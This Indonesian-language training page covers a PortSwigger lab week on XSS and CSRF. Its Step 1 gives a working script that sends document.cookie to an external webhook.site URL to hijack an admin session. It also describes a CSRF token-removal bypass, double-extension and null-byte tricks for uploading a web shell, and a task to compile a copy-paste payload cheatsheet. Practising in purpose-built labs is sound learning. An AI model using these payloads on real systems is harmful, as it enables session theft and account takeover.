# 💀 Week 17 · Day 5: Lab & Weekly Mission PortSwigger XSS/CSRF

> **Rank**: BREACH | **Minggu ke-17**, Hari 5/5 | **Durasi**: ~60–90 menit

---

## 📊 Progress Tracker

### Rank Progress
[▓▓▓▓▓▓░░░░] 60% — BREACH Rank (Minggu 3 dari 5)

### Overall Journey
[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░] 70% — Hari 85 dari 120

### Rank Map
✅ VOID → ✅ CIPHER → ✅ PACKET → ✅ FORGE → 🔄 BREACH → ⬜ SENTINEL

---

## 📝 Rekap Minggu Ini

Kompetensi teknis Anda dalam mendalami eksploitasi serangan di sisi klien (*Client-Side Attacks*) beserta teknik merantai kerentanan (*Chaining Vulns*) telah diasah sepanjang minggu ini:

| Hari | Topik | Key Takeaway |
|------|-------|-------------|
| Day 1 | XSS & Payload Crafting | Meracik *payload* skrip eksploitasi untuk mencuri *Cookie* dan mem-bypass filter WAF. |
| Day 2 | CSRF & SSRF | Memaksa browser korban mengeksekusi aksi berbahaya tanpa disadari (*CSRF*), serta menipu peladen untuk menyerang jaringan internalnya sendiri (*SSRF*). |
| Day 3 | File Upload & IDOR | Menginjeksi *Web Shell* PHP melalui celah fitur unggah file, serta memanipulasi parameter akses (*IDOR*). |
| Day 4 | Chaining Vulnerabilities | Menggabungkan celah kecil terisolasi (*Self-XSS + SSRF* atau *CSRF*) menjadi serangan fatal berskala *Account Takeover*. |

---

## 🧪 Hands-On Lab

### Prerequisites
- Koneksi internet yang stabil.
- Akun portal laboratorium simulasi di **[PortSwigger Web Security Academy](https://portswigger.net/web-security)**.
- Aplikasi *Burp Suite Community* yang siap digunakan untuk menyadap (*Intercept*) lalu lintas jaringan.

### Misi Hari Ini: "Membantai Tembok Klien (XSS/CSRF Gauntlet)"

Pada lab ini, Anda ditugaskan meluncurkan serangan eksploitasi di lingkungan sisi klien (*Client-Side*). Anda diwajibkan menjerat peramban pengguna agar korban memicu eksekusi *payload* berbahaya secara otomatis.

### Step 1: Merampas Sesi Otentikasi (XSS Cookie Stealing)
1. Buka lab PortSwigger bertajuk: **"Exploiting cross-site scripting to steal cookies"**.
2. Anda akan menemukan fitur komentar pada halaman *Blog*.
3. Buka *Burp Collaborator* (atau gunakan layanan penadah *payload* eksternal gratis seperti *Webhook.site*). Salin URL dari layanan penadah tersebut.
4. Tancapkan injeksi payload XSS pada kolom komentar:
   ```html
   <script>
   fetch('https://webhook.site/alamat_webhook_milikmu', {
     method: 'POST',
     mode: 'no-cors',
     body: document.cookie
   });
   </script>
   ```
5. Amati *Webhook* Anda. Saat simulasi bot Admin PortSwigger memuat halaman komentar tersebut, *Session Cookie* milik Admin akan tereksekusi dan terkirim otomatis ke layar Webhook-mu. Gunakan *Cookie* tersebut untuk menelikung masuk sebagai Admin!

### Step 2: Menjahit Eksekusi Paksaan (CSRF Token Bypass)
1. Buka lab sasaran bertajuk: **"CSRF where token validation depends on token being present"**.
2. Di lab ini, peladen memvalidasi keabsahan token *CSRF*, TAPI **hanya jika** token tersebut disertakan. Jika parameter token itu dibuang sepenuhnya, peladen justru meloloskan eksekusi tersebut!
3. Gunakan *Burp Suite*. Tangkap (*Intercept*) permintaan formulir *Update Email*.
4. Buatlah antarmuka *HTML* `CSRF Payload` di Burp Suite *Engagement Tools*. Hapus tag `<input type="hidden" name="csrf"...>` secara keseluruhan dari struktur *HTML*-mu tersebut.
5. Uji skrip pemaksaan tersebut di browser. Email korban pun sukses terganti karena peladen gagal mendeteksi serangan saat token ditiadakan!

---

## 🎯 Weekly Mission

### Misi: "Pencetakan Manuskrip Payload (Exploitation Cheatsheet)"

**Deskripsi:** Hacker profesional tidak pernah menghafal dan mengetik ulang *Payload* eksploitasi rumit dari awal. Mereka menyimpannya di dalam lembar ringkasan (*Cheat Sheet*) agar siap disalin-tempel saat *Bug Hunting*.

**Tugas Mandiri:** Selesaikan **5 Lab** silang (pilih antara *XSS, CSRF, atau File Upload*) dari *PortSwigger*. Selama menyelesaikan lab, kumpulkan dan catat 10 variasi *Payload XSS/CSRF* andalan yang terbukti sukses menjebol sistem ke dalam satu manuskrip.

**Deliverables:**
1. Satu dokumen *Markdown* bernama `PAYLOAD_CHEATSHEET.md`.
2. Isi dokumen mencakup dua hal:
 - **XSS Payloads:** (Tulis 5 variasi bypass payload XSS. Contoh: `<img src=x onerror=...>`, `<svg onload=...>`, dll).
 - **Lab Writeups:** (Catat 5 judul mesin Lab PortSwigger yang sukses divalidasi dengan status 'Solved', serta rangkuman singkat taktik penaklukannya).

**Kriteria Sukses:**
- [ ] 5 mesin Lab PortSwigger berhasil diselesaikan (status *Solved*).
- [ ] Tersedia dokumentasi 10 baris Payload (jangan sekadar menggunakan `<script>alert(1)</script>`).
- [ ] Tersedia ringkasan temuan di mana letak kerentanan pada lab-lab tersebut.

---

## 💡 Knowledge Check

<details>
<summary>❓ [MUDAH] Dalam injeksi XSS untuk mencuri kalung sesi Admin, objek JavaScript apakah yang diincar dan dikirimkan oleh peretas ke server penadahnya?</summary>

**Jawaban:** Atribut *document.cookie*.
</details>

<details>
<summary>❓ [MUDAH] Metode peretasan Cross-Site Request Forgery (CSRF) menitikberatkan manipulasi yang memaksa pengguna target untuk...?</summary>

**Jawaban:** Mengeksekusi permintaan (Request) tertentu (seperti mentransfer aset atau mengganti email) ke server target **tanpa sepengetahuan atau kehendak sadar korban**, selama sesi otentikasi korban di browser tersebut masih aktif.
</details>

<details>
<summary>❓ [SEDANG] Ketika server melarang keras ekstensi tulen `shell.php` dalam unggahan file, teknik manipulasi nama file apa yang bisa dilakukan pentester untuk menebeng eksploitasi?</summary>

**Jawaban:** Menggunakan siasat ekstensi ganda (*Double Extension*) `shell.php.jpg` atau injeksi Null Byte `shell.php%00.jpg`.
</details>

<details>
<summary>❓ [SEDANG] Serangan SSRF didesain untuk menyusup dan memaksa peladen target untuk menyerang jaringan internalnya sendiri. Alamat IP lokal mana yang paling lazim dieksploitasi untuk menginterogasi dasbor internal?</summary>

**Jawaban:** IP Localhost `127.0.0.1` (atau `localhost`).
</details>

<details>
<summary>❓ [SULIT] Jelaskan alur eksploitasi merantai (Chaining) antara celah manipulasi CSRF (mengganti email korban) menuju pengambilalihan akun secara total (Account Takeover)!</summary>

**Jawaban:** Peretas merangkai jebakan *CSRF* dan menipu korban untuk mengekliknya; akibatnya, alamat Email korban di sistem web target terganti menjadi alamat email milik *Hacker* secara diam-diam. Dengan berbekal email baru tersebut, peretas tinggal pergi ke halaman *Login*, mengeklik fitur *"Forgot Password / Lupa Sandi"*, dan tautan pemulihan sandi akan masuk langsung ke kotak masuk (*Inbox*) peretas. Akun berhasil diambil alih secara penuh!
</details>

---

## 📋 Weekly Checklist

- [ ] Saya memahami alur eksekusi *Payload* pencurian sesi (Cookie Stealing).
- [ ] Saya paham bahaya penipuan otorisasi CSRF dan penetrasi lokal SSRF.
- [ ] Saya menguasai kelicikan teknik *Double Extension* & *Null Byte* pada unggah *Web Shell*.
- [ ] Saya fasih menjabarkan alur merantai kerentanan (*Chaining Vulnerabilities*).
- [ ] Saya telah menuntaskan dan menyetor naskah `PAYLOAD_CHEATSHEET.md` (Weekly Mission).

---

## 💬 Diskusi Minggu Ini

1. Setelah satu minggu ini membedah berbagai eksploitasi di sisi antarmuka klien (XSS, CSRF), menurutmu mana yang lebih menakutkan secara skenario nyata: server databasemu dibongkar melalui *SQL Injection*, atau kamu diretas secara diam-diam hanya karena mengeklik link jebakan *CSRF* dari sebuah gambar? Mengapa taktik penipuan klien ini terkadang berimbas sama fatalnya dengan jebolnya server?

---

## 🏆 Achievement Unlocked!

```
┌─────────────────────────────────────┐
│                                     │
│     🎖️ THE CLIENT CORRUPTOR         │
│          Week 17 Complete           │
│  "Trust no link, trust no script,   │
│        trust no parameter."         │
│                                     │
└─────────────────────────────────────┘
```

Selamat! Operasional pengujian eksploitasi di sisi klien (*Client-Side Attacks*) telah berhasil Anda lumat secara paripurna di minggu operasional ini!

---

## ➡️ Preview Minggu Depan

**Minggu 18: Burp Suite & Advanced Tooling**

Masa-masa menebak parameter secara manual tanpa alat bantu telah usai! Minggu depan, kita akan mulai mengoperasikan *senjata utama* para *Bug Hunter* profesional: **Burp Suite**. Kita akan belajar cara menyadap *Request* secara perlahan (*Intercept*), melepaskan serangan brutal berskala masif menggunakan *Intruder*, dan merajut serangan otomatis yang mampu menenggelamkan tameng perlindungan Web tanpa ampun!

> 🚀 *"The manual labor ends. The orchestration of chaos begins."*

---

*📅 TISS Null Teaming · Week 17 · Day 5 · BREACH Rank*
